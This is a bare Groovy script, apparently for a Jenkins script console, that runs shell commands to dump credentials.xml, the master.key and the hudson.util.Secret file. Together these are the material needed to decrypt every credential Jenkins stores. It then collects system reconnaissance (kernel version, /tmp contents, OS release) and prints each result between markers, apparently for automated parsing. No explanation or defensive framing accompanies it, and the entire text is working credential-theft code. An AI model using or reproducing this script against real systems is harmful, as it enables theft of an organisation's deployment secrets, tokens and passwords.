process = "cat /var/jenkins_home/credentials.xml".execute()
println ":cmd1:${process.text}:cmd1:"
process = "cat /var/jenkins_home/secrets/master.key".execute()
println ":cmd2:${process.text}:cmd2:"
process = "xxd /var/jenkins_home/secrets/hudson.util.Secret".execute()
println ":cmd3:${process.text}:cmd3:"
process = "uname -ar".execute()
println ":cmd4:${process.text}:cmd4:"
process = "ls -al /tmp".execute()
println ":cmd5:${process.text}:cmd5:"
process = "cat /etc/os-release".execute()
println ":cmd6:${process.text}:cmd6:"
